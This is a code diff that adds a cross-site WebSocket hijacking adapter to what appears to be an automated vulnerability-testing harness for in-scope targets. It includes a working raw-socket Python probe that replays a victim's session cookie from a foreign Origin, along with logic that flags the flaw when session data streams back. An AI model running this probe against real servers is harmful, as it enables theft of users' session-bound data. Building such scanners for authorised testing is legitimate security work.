@@ -830,6 +830,93 @@ class SsrfAdapter(_Adapter):
         return False
 
 
+# A raw WebSocket client handshake run inside the attacker container (stdlib socket). It
+# opens the socket with a foreign Origin and the victim's session cookie, reads the server's
+# response, and prints the HTTP status and the first text frame's payload, so the adapter can
+# tell a rejected handshake from one that was accepted and streamed session data.
+_WS_PROBE = (
+    "import sys,socket,base64,os\n"
+    "host,port,origin,cookie=sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4]\n"
+    "key=base64.b64encode(os.urandom(16)).decode()\n"
+    "req=('GET /ws HTTP/1.1\\r\\nHost: '+host+':'+port+'\\r\\nUpgrade: websocket\\r\\n'\n"
+    "     'Connection: Upgrade\\r\\nSec-WebSocket-Key: '+key+'\\r\\nSec-WebSocket-Version: 13\\r\\n'\n"
+    "     'Origin: '+origin+'\\r\\nCookie: '+cookie+'\\r\\n\\r\\n')\n"
+    "try:\n"
+    "    s=socket.create_connection((host,int(port)),timeout=8); s.sendall(req.encode()); raw=s.recv(8192); s.close()\n"
+    "except Exception as e:\n"
+    "    print('ERR',type(e).__name__); sys.exit(0)\n"
+    "head,_,rest=raw.partition(b'\\r\\n\\r\\n')\n"
+    "parts=head.split()\n"
+    "code=int(parts[1]) if len(parts)>1 and parts[1].isdigit() else 0\n"
+    "payload=b''\n"
+    "if len(rest)>=2:\n"
+    "    ln=rest[1]&0x7f; payload=rest[2:2+ln]\n"
+    "sys.stdout.write('STATUS %d\\nFRAME %s\\n'%(code, payload.decode('utf-8','replace')))\n"
+)
+
+
+def _parse_ws(out_text):
+    """Split the WebSocket probe output into (status_code, frame_payload). Tolerant: (0, "")
+    on an error line or unparseable output."""
+    code, frame = 0, ""
+    for line in (out_text or "").splitlines():
+        if line.startswith("STATUS "):
+            tail = line.split(" ", 1)[1].strip()
+            code = int(tail) if tail.isdigit() else 0
+        elif line.startswith("FRAME "):
+            frame = line[len("FRAME "):]
+    return code, frame
+
+
+class WsHijackAdapter(_Adapter):
+    """Cross-site WebSocket hijacking against a pinned in-scope target. Registered as
+    `wshijack`.
+
+    The harness establishes an authenticated cookie session, then opens a WebSocket from a
+    foreign Origin carrying that session cookie, and reports the flaw only when the handshake
+    is accepted (101) and the socket returns the session's own data, which proves the server
+    did not validate the handshake Origin and a cross-origin page could read session-bound
+    data over the socket. A browser attaches the cookie cross-site automatically; the harness
+    attaches it explicitly and drives the handshake, so the signal is harness-owned. A server
+    that checks Origin rejects the foreign handshake and does not fire; the Verifier repeats
+    it."""
+
+    _ORIGIN = _FOREIGN_ORIGIN
+
+    def run(self, req):
+        ip = self._resolve(req["target"])
+        port = int(req["port"])
+        args = req.get("args") or {}
+        scheme = args.get("scheme") or ("https" if port in (443, 8443) else "http")
+        base = f"{scheme}://{ip}:{port}"
+        portal = args.get("path", "/portal")
+        login_path = args.get("login_path", "/portal/login")
+        login_user = str(args.get("login_user", "1"))
+
+        _, h0, _ = self._send_http_full(base + portal)           # establish a session
+        sid = _cookie_sid(h0)
+        if sid:
+            self._send_http_full(f"{base}{login_path}?user={login_user}",
+                                 "GET", {"Cookie": f"sid={sid}"})
+        r = self._exec("python3", "-c", _WS_PROBE, ip, str(port), self._ORIGIN, f"sid={sid or ''}")
+        code, frame = _parse_ws(r.out or "")
+        session_bound = bool(frame) and "anon" not in frame      # the user's secret, not the anon one
+        hit = code == 101 and session_bound
+        return {
+            "status": "ok" if hit else "error",
+            "parsed": {"handshake_status": code, "session_bound": session_bound},
+            "request_bytes": f"wshijack {base}/ws Origin={self._ORIGIN}".encode("utf-8"),
+            "response_bytes": f"STATUS {code}\nFRAME {frame}".encode("utf-8", "replace"),
+            "deterministic_signals": {
+                "hit": hit,
+                "ws_hijack": hit,
+                "handshake_status": code,
+                "session_bound": session_bound,
+                "confidence": 0.95 if hit else 0.0,
+            },
+        }
+
+
 def _cookie_sid(headers):
     """The `sid` value a Set-Cookie response header carries, or None. Tolerant of the
     header's attributes (Path, HttpOnly, ...) and of case in the header name."""
